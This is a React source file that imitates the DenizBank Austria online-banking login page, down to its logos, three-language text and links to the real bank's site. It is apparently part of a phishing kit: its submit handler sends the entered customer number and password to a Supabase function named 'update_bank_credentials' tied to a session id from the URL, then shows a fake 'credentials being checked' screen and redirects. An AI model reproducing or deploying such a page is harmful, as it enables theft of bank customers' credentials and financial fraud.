import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ChevronDown, ChevronRight } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { HoverCard, HoverCardTrigger, HoverCardContent } from "@/components/ui/hover-card";

import logo from "@/assets/denizbank-logo.svg";
import bg from "@/assets/denizbank-bg.jpg";
import enbdLogo from "@/assets/enbd-logo.png";
import denizIcon from "@/assets/denizbank-icon.png";
import barrierefreiIcon from "@/assets/denizbank-barrierefrei.svg";
import sperreIcon from "@/assets/denizbank-sperreaufheben.svg";
import passwortVergessenIcon from "@/assets/denizbank-passwortvergessen.svg";
import impressumIcon from "@/assets/denizbank-impressum.svg";
import faqIcon from "@/assets/denizbank-faq.svg";
import datenschutzIcon from "@/assets/denizbank-datenschutz.svg";
import sicherheitIcon from "@/assets/denizbank-sicherheit.svg";
import gbIcon from "@/assets/denizbank-gb.svg";
import telefonIcon from "@/assets/denizbank-telefon.svg";

type Lang = "DE" | "EN" | "TR";

const translations: Record<Lang, Record<string, string>> = {
  DE: {
    welcomeLine1: "Willkommen",
    welcomeLine2: "bei der DenizBank",
    hinweisTitle: "Hinweis",
    hinweisText: "Bitte teilen Sie Ihre persönlichen Anmeldedaten nicht mit anderen.",
    tabPrivat: "Privat",
    tabGemein: "Gemeinschaft",
    tabFirma: "Firma",
    loginLabel: "Login (Kundennummer)",
    saveUser: "Benutzer speichern",
    kundennummerPlaceholder: "Kundennummer eingeben",
    passwortLabel: "Passwort",
    passwortPlaceholder: "Passwort eingeben",
    weiter: "Weiter",
    sperre: "Sperre aufheben",
    passwortVergessen: "Passwort vergessen",
    barrierefrei: "Barrierefrei",
    saveUserTooltip: "Wenn Sie diese Checkbox aktivieren, werden die Kundennummer und Ihr Name bei der nächsten Anmeldung auf diesem Browser angezeigt. Eine Authentifizierung ist aus Sicherheitsgründen weiterhin erforderlich. Sie können die gespeicherten Anmeldedaten jederzeit wieder löschen.",
    kundennummerTooltip: "Ihre Kundennummer finden Sie auf Ihrer Bankkarte.",
    footerImpressum: "Impressum",
    footerFaq: "FAQ",
    footerDatenschutz: "Datenschutz",
    footerSicherheit: "Sicherheit",
    footerAGB: "Geschäftsbedingungen",
    footerPhone: "0800 88 66 00",
  },
  EN: {
    welcomeLine1: "Welcome",
    welcomeLine2: "at DenizBank",
    hinweisTitle: "Information",
    hinweisText: "For your safety do not share your login data with anyone.",
    tabPrivat: "Private",
    tabGemein: "Joint Account",
    tabFirma: "Corporate",
    loginLabel: "Login (Customer Number)",
    saveUser: "Remember User",
    kundennummerPlaceholder: "Enter Customer Number",
    passwortLabel: "Password",
    passwortPlaceholder: "Enter Password",
    weiter: "Continue",
    sperre: "Remove Blockage",
    passwortVergessen: "Forgot Password",
    barrierefrei: "Accessibility",
    saveUserTooltip: "If you activate this checkbox, your customer number and name will be shown in this browser when you next log in. Authentication is still required for security reasons. You can delete the saved login data at any time.",
    kundennummerTooltip: "You can find your customer number on your bank card.",
    footerImpressum: "Site Notice",
    footerFaq: "FAQ",
    footerDatenschutz: "Data Protection",
    footerSicherheit: "Security",
    footerAGB: "Terms & Conditions",
    footerPhone: "0800 88 66 00",
  },
  TR: {
    welcomeLine1: "İnternet Bankacılığı'na",
    welcomeLine2: "Hoş Geldiniz",
    hinweisTitle: "Bilgi",
    hinweisText: "Güvenliğiniz için size özel giriş bilgilerinizi kimse ile paylaşmayınız.",
    tabPrivat: "Bireysel",
    tabGemein: "Ortak",
    tabFirma: "Kurumsal",
    loginLabel: "Müşteri Numarası",
    saveUser: "Kullanıcıyı Hatırla",
    kundennummerPlaceholder: "Müşteri Numarası",
    passwortLabel: "Şifre",
    passwortPlaceholder: "Şifre",
    weiter: "DEVAM",
    sperre: "Bloke Kaldır",
    passwortVergessen: "Şifremi Unuttum",
    barrierefrei: "Engelsiz Bankacılık",
    saveUserTooltip: "Hatırla butonunu aktive etmeniz halinde, bir sonraki girişinizde müşteri numaranız ve isminiz tarayıcınızda gösterilecektir. Güvenlik nedeni ile kimlik doğrulama gereklidir. Kayıtlı oturum açma bilgilerinizi istediğiniz zaman silebilirsiniz.",
    kundennummerTooltip: "Müşteri numaranızı banka kartınızın arkasında bulabilirsiniz.",
    footerImpressum: "İletişim",
    footerFaq: "SSS",
    footerDatenschutz: "Veri Güvenliği",
    footerSicherheit: "Güvenlik",
    footerAGB: "Hizmet Koşulları",
    footerPhone: "0800 88 66 00",
  },
};

const Denizbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [kundennummer, setKundennummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [lang, setLang] = useState<Lang>("DE");
  const [activeTab, setActiveTab] = useState<"privat" | "gemein" | "firma">("privat");
  const [saveUser, setSaveUser] = useState(false);

  const t = translations[lang];

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("DenizBank - Internetbanking", denizIcon);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: kundennummer,
        p_password: passwort,
        p_username_label: "Kundennummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const footerLinks = [
    { icon: impressumIcon, label: t.footerImpressum, href: "https://www.denizbank.at/at/uber-uns/impressum" },
    { icon: faqIcon, label: t.footerFaq, href: "https://www.denizbank.at/at/kundenservice/FAQ" },
    { icon: datenschutzIcon, label: t.footerDatenschutz, href: "https://www.denizbank.at/at/kundenservice/rechtliches/datenschutz" },
    { icon: sicherheitIcon, label: t.footerSicherheit, href: "https://www.denizbank.at/at/kundenservice/sicherheit" },
    { icon: gbIcon, label: t.footerAGB, href: "https://www.denizbank.at/at/kundenservice/rechtliches/geschaftsbedingungen" },
    { icon: telefonIcon, label: t.footerPhone, href: "https://ebanking.denizbank.at/LoginIB.aspx?lang=DE#" },
  ];

  const InfoBadge = () => (
    <span className="inline-flex h-5 w-5 items-center justify-center rounded-full border border-[#0073b0] text-[#0073b0] text-[11px] font-bold leading-none cursor-help">i</span>
  );

  const MaskIcon = ({ src }: { src: string }) => (
    <span
      className="h-4 w-4 bg-current inline-block"
      style={{
        WebkitMaskImage: `url(${src})`,
        maskImage: `url(${src})`,
        WebkitMaskRepeat: "no-repeat",
        maskRepeat: "no-repeat",
        WebkitMaskPosition: "center",
        maskPosition: "center",
        WebkitMaskSize: "contain",
        maskSize: "contain",
      }}
    />
  );

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen w-full bg-cover bg-center relative"
        style={{ backgroundImage: `url(${bg})`, fontFamily: "'Open Sans', sans-serif" }}
      >
        <div className="absolute inset-0 bg-black/50" />

        <div className="relative min-h-screen flex flex-col">
          {/* Header */}
          <header className="px-6 md:px-10 pt-0 md:pt-12 pb-4 md:pb-6">
            <div className="max-w-7xl mx-auto flex flex-col items-center gap-3 md:flex-row md:items-center md:justify-between">
              <img src={logo} alt="DenizBank" className="h-8 md:h-10" />
              <div className="flex flex-col items-center gap-3 md:flex-row md:gap-4 text-white text-sm">
                <button className="flex items-center gap-2 px-4 py-2 hover:opacity-80">
                  <img src={barrierefreiIcon} alt="" className="h-4 w-4 brightness-0 invert" />
                  {t.barrierefrei}
                </button>
                <div className="flex items-center rounded-md border border-white/60 overflow-hidden text-sm">
                  {(["DE", "EN", "TR"] as const).map((l) => (
                    <button
                      key={l}
                      onClick={() => setLang(l)}
                      className={`px-4 py-2 transition ${lang === l ? "text-white font-semibold" : "text-white/50 hover:text-white/80"}`}
                    >
                      {l}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          </header>

          {/* Content */}
          <main className="flex-1 flex items-start md:items-center px-6 md:px-10 py-4 md:py-10">
            <div className="w-full max-w-7xl mx-auto grid md:grid-cols-2 gap-10 items-center">
              {/* Linke Seite */}
              <div className="text-white order-2 md:order-none">
                <h1 className="hidden md:block text-5xl md:text-7xl font-extrabold leading-tight text-white drop-shadow-lg relative z-10">
                  {t.welcomeLine1}<br />{t.welcomeLine2}
                </h1>
                <div className="mt-2 md:mt-12 max-w-md mx-auto md:mx-0 text-center md:text-left bg-white/10 backdrop-blur-md md:bg-transparent md:backdrop-blur-none rounded-md md:rounded-none p-4 md:p-1 md:border-l-2 md:border-white/70 md:pl-5">
                  <div className="text-base md:text-lg font-semibold mb-1">{t.hinweisTitle}</div>
                  <p className="text-xs md:text-sm leading-relaxed text-white/90">
                    {t.hinweisText}
                  </p>
                </div>
              </div>

              {/* Login Card */}
              <div className="md:justify-self-end w-full max-w-md order-1 md:order-none">
                {/* Tabs */}
                <div className="grid grid-cols-3 text-sm">
                  {(["privat", "gemein", "firma"] as const).map((tab) => {
                    const label = tab === "privat" ? t.tabPrivat : tab === "gemein" ? t.tabGemein : t.tabFirma;
                    const active = activeTab === tab;
                    const isPrivat = tab === "privat";
                    return (
                      <button
                        key={tab}
                        onClick={isPrivat ? () => setActiveTab(tab) : undefined}
                        disabled={!isPrivat}
                        className={`flex items-center justify-between px-5 py-4 ${
                          active
                            ? "bg-white rounded-t-md text-[#1874ca] font-semibold text-base"
                            : "bg-[#605f60]/70 backdrop-blur-md text-white/90 cursor-default"
                        }`}
                      >
                        <span>{label}</span>
                        {active ? (
                          <ChevronDown className="hidden md:inline-block h-4 w-4 text-[#1874ca]" />
                        ) : (
                          <ChevronRight className="hidden md:inline-block h-4 w-4" />
                        )}
                      </button>
                    );
                  })}
                </div>


                {/* Card */}
                <div className="bg-white rounded-b-md p-6 space-y-4 shadow-2xl">
                  <div className="flex items-center justify-between text-sm">
                    <label className="text-[#555] font-semibold">{t.loginLabel}</label>
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-gray-600">{t.saveUser}</span>
                      <button
                        onClick={() => setSaveUser((s) => !s)}
                        className={`relative inline-flex h-5 w-9 items-center rounded-full border transition ${saveUser ? "bg-[#1874ca] border-[#1874ca]" : "bg-white border-gray-300"}`}
                        aria-pressed={saveUser}
                      >
                        <span className={`inline-block h-4 w-4 rounded-full transition ${saveUser ? "bg-white translate-x-[18px]" : "bg-[#1874ca] translate-x-0.5"}`} />
                      </button>
                      <HoverCard openDelay={100} closeDelay={100}>
                        <HoverCardTrigger asChild>
                          <span><InfoBadge /></span>
                        </HoverCardTrigger>
                        <HoverCardContent side="bottom" align="end" className="bg-[#555]/85 backdrop-blur-sm text-white border-none text-xs leading-relaxed w-72">
                          {t.saveUserTooltip}
                        </HoverCardContent>
                      </HoverCard>
                    </div>
                  </div>

                  <div className="relative">
                    <input
                      type="text"
                      value={kundennummer}
                      onChange={(e) => setKundennummer(e.target.value)}
                      placeholder={t.kundennummerPlaceholder}
                      className="h-12 w-full rounded border border-gray-300 px-3 pr-10 text-sm hover:border-[#1874ca] focus:border-[#e7041f] focus:outline-none placeholder:text-[#555]"
                    />
                    <span className="absolute right-3 top-1/2 -translate-y-1/2">
                      <HoverCard openDelay={100} closeDelay={100}>
                        <HoverCardTrigger asChild>
                          <span><InfoBadge /></span>
                        </HoverCardTrigger>
                        <HoverCardContent side="top" align="end" className="bg-[#555]/85 backdrop-blur-sm text-white border-none text-xs leading-relaxed w-72">
                          {t.kundennummerTooltip}
                        </HoverCardContent>
                      </HoverCard>
                    </span>
                  </div>

                  <label className="block text-sm text-[#555] font-semibold pt-1">{t.passwortLabel}</label>
                  <input
                    type="password"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    placeholder={t.passwortPlaceholder}
                    className="h-12 w-full rounded border border-gray-300 px-3 text-sm hover:border-[#1874ca] focus:border-[#e7041f] focus:outline-none placeholder:text-[#555]"
                  />

                  <button
                    onClick={handleSubmit}
                    className="w-full h-12 rounded text-white font-extrabold tracking-widest uppercase text-sm hover:opacity-90 transition"
                    style={{ background: "linear-gradient(90deg, #e70317 0%, #c20086 100%)" }}
                  >
                    {t.weiter}
                  </button>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
                    <a
                      href="https://ebanking.denizbank.at/UnregisteredUser/NewUserRegistration_NonFlashNew.aspx?lang=DE"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="group relative flex items-center justify-center h-11 w-full rounded border border-[#555] text-sm text-[#555] hover:border-[#e7041f] hover:text-[#e7041f] transition-colors"
                    >
                      <span className="absolute left-3"><MaskIcon src={sperreIcon} /></span>
                      {t.sperre}
                    </a>
                    <a
                      href="https://www.denizbank.at/at/privatkunden/internetbanking/passwort-vergessen"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="group relative flex items-center justify-center h-11 w-full rounded border border-[#555] text-sm text-[#555] hover:border-[#1874ca] hover:text-[#1874ca] transition-colors"
                    >
                      <span className="absolute left-3"><MaskIcon src={passwortVergessenIcon} /></span>
                      {t.passwortVergessen}
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </main>

          {/* Footer */}
          <footer className="px-6 md:px-10 py-6">
            <div className="max-w-7xl mx-auto flex flex-col items-center gap-6 md:flex-row md:items-center md:justify-between">
              <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-3 text-white text-sm order-1 md:order-none md:justify-start">
                {footerLinks.map((l) => (
                  <a
                    key={l.label}
                    href={l.href}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center gap-2 hover:opacity-80"
                  >
                    <img src={l.icon} alt="" className="h-6 w-6 md:h-4 md:w-4 brightness-0 invert" />
                    <span className="hidden md:inline">{l.label}</span>
                  </a>
                ))}
              </div>
              <div className="bg-white rounded p-1 inline-flex w-fit order-2 md:order-none">
                <img src={enbdLogo} alt="ENBD" className="h-6" />
              </div>
            </div>
          </footer>
        </div>
      </div>
    </>
  );
};

export default Denizbank;
